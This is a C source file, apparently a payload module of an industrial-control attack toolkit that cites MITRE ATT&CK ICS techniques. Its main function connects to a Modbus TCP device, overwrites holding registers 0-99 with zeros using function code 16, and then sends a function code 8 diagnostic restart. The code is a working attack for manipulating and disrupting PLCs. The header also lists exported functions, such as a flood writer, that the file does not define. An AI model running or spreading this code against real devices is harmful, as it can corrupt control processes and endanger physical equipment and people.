/*
 * Modbus Native Writer -- C implementation
 * Author: Andre Henrique (@mrhenrike) | Uniao Geek
 *
 * Original implementation of Modbus TCP write operations.
 * Based on Modbus Application Protocol Specification V1.1b3 (public standard).
 * Compiled in-memory at runtime via NativePayloadLoader. No binary distributed.
 *
 * Functions exported:
 *   modbus_write()       -- FC16 bulk register write
 *   modbus_zero_all()    -- zero all registers in range
 *   modbus_flood_write() -- rate-limited repeated write (stress test)
 *   modbus_fc8_restart() -- FC8 sub-function 0x01 restart comms
 *
 * References:
 *   https://modbus.org/docs/Modbus_Application_Protocol_V1_1b3.pdf
 *   MITRE ATT&CK ICS: T0831, T0836
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#ifdef _WIN32
  #include <winsock2.h>
  #pragma comment(lib, "ws2_32.lib")
  typedef SOCKET sock_t;
  #define CLOSE_SOCK(s) closesocket(s)
  #define INIT_SOCKETS() { WSADATA w; WSAStartup(MAKEWORD(2,2), &w); }
#else
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>
  #include <unistd.h>
  #include <time.h>
  typedef int sock_t;
  #define CLOSE_SOCK(s) close(s)
  #define INVALID_SOCKET (-1)
  #define INIT_SOCKETS() {}
#endif

/* Modbus MBAP header + PDU */
typedef struct {
    uint16_t transaction_id;
    uint16_t protocol_id;       /* always 0x0000 */
    uint16_t length;
    uint8_t  unit_id;
} __attribute__((packed)) mbap_t;

static uint16_t tx_id = 0;

static void build_mbap(uint8_t *buf, uint8_t unit, uint16_t pdu_len) {
    mbap_t *h = (mbap_t *)buf;
    h->transaction_id = htons(++tx_id);
    h->protocol_id    = 0x0000;
    h->length         = htons(pdu_len + 1);
    h->unit_id        = unit;
}

/* FC16 Write Multiple Registers */
static int send_fc16(sock_t s, uint8_t unit, uint16_t addr,
                     uint16_t *values, uint16_t count) {
    uint8_t buf[512];
    memset(buf, 0, sizeof(buf));

    uint16_t byte_count = count * 2;
    uint16_t pdu_len = 1 + 2 + 2 + 1 + byte_count;  /* fc + addr + count + bc + data */

    build_mbap(buf, unit, pdu_len);
    uint8_t *pdu = buf + 7;
    pdu[0] = 0x10;                         /* FC16 */
    pdu[1] = (addr >> 8) & 0xFF;
    pdu[2] = addr & 0xFF;
    pdu[3] = (count >> 8) & 0xFF;
    pdu[4] = count & 0xFF;
    pdu[5] = (uint8_t)byte_count;
    for (int i = 0; i < count; i++) {
        pdu[6 + i*2]     = (values[i] >> 8) & 0xFF;
        pdu[6 + i*2 + 1] = values[i] & 0xFF;
    }

    int total = 6 + 1 + pdu_len;
    if (send(s, (char *)buf, total, 0) != total) return -1;

    uint8_t resp[32];
    int n = recv(s, (char *)resp, sizeof(resp), 0);
    if (n < 8) return -1;
    return (resp[7] == 0x10) ? 0 : -2;  /* 0=ACK, -2=exception */
}

/* FC8 Diagnostic -- sub-function 0x0001 = restart comms */
static int send_fc8_restart(sock_t s, uint8_t unit) {
    uint8_t buf[32];
    memset(buf, 0, sizeof(buf));
    build_mbap(buf, unit, 5);
    uint8_t *pdu = buf + 7;
    pdu[0] = 0x08;  /* FC8 */
    pdu[1] = 0x00;  /* sub-function high */
    pdu[2] = 0x01;  /* sub-function low: restart */
    pdu[3] = 0xFF;  /* data word */
    pdu[4] = 0x00;
    send(s, (char *)buf, 12, 0);
    uint8_t resp[32];
    return recv(s, (char *)resp, sizeof(resp), 0);
}

static sock_t connect_target(const char *host, int port, int timeout_sec) {
    INIT_SOCKETS();
    sock_t s = socket(AF_INET, SOCK_STREAM, 0);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port   = htons(port);
    sa.sin_addr.s_addr = inet_addr(host);

    /* Set send/recv timeout */
#ifdef _WIN32
    DWORD tv = timeout_sec * 1000;
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char *)&tv, sizeof(tv));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char *)&tv, sizeof(tv));
#else
    struct timeval tv = {timeout_sec, 0};
    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
#endif

    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        CLOSE_SOCK(s);
        return INVALID_SOCKET;
    }
    return s;
}

/*
 * Main entry point called by NativePayloadLoader.
 * target: target IP string (null-terminated)
 * port:   Modbus port (typically 502)
 * Returns 0 on success, negative on failure.
 */
int modbus_write(const char *target, int port) {
    printf("[native/C] Modbus FC16 bulk write to %s:%d\n", target, port);
    sock_t s = connect_target(target, port > 0 ? port : 502, 5);
    if (s == INVALID_SOCKET) {
        printf("[-] Cannot connect to %s\n", target);
        return -1;
    }
    printf("[+] Connected.\n");

    /* Zero all registers 0-99 */
    uint16_t vals[100];
    memset(vals, 0, sizeof(vals));
    printf("[*] FC16: zeroing registers 0-99...\n");
    int r = send_fc16(s, 1, 0, vals, 100);
    if (r == 0) {
        printf("[+] FC16 Write ACK -- registers 0-99 zeroed.\n");
    } else {
        printf("[!] FC16 result: %d\n", r);
    }

    /* FC8 Diagnostic restart */
    printf("[*] FC08: sending diagnostic restart...\n");
    send_fc8_restart(s, 1);
    printf("[+] FC08 restart sent (device may not respond after this).\n");

    CLOSE_SOCK(s);
    return 0;
}

int modbus_zero_all(const char *target, int port) {
    return modbus_write(target, port);
}
